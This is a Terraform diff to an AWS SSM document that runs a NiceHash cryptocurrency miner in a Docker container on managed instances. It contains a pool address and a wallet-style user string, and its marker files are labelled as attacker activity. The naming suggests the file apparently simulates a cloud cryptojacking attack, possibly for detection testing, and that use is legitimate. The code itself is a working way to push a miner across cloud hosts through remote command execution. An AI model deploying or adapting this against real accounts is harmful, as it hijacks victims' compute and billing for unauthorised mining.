@@ -3,8 +3,6 @@ locals {
     name = "nicehash_miner"
     server = "equihash.usa.nicehash.com:3357"
     user = "3HotyetPPdD6pyGWtZvmMHLcXxmNuWR53C.worker1"
-    task_timeout = 720
-    docker_runtime = 600
 }
 
 resource "aws_ssm_document" "exec_docker_cpuminer" {
@@ -26,9 +24,10 @@ resource "aws_ssm_document" "exec_docker_cpuminer" {
                     ]
                 },
                 "inputs": {
-                    "timeoutSeconds": "${local.task_timeout}",
+                    "timeoutSeconds": "60",
                     "runCommand": [
-                        "docker stop ${local.name}",
+                        "echo \"starting...\" > /tmp/attacker_exec_docker_cpuminer",
+                        "if [[ `docker ps | grep ${local.name}` ]] then docker stop ${local.name}; fi 2>&1 >> /tmp/attacker_exec_docker_cpuminer",
                         "docker run --rm -d --network=host --name ${local.name} ${local.image} -l ${local.server} -u ${local.user}",
                         "touch /tmp/attacker_exec_docker_cpuminer",
                     ]
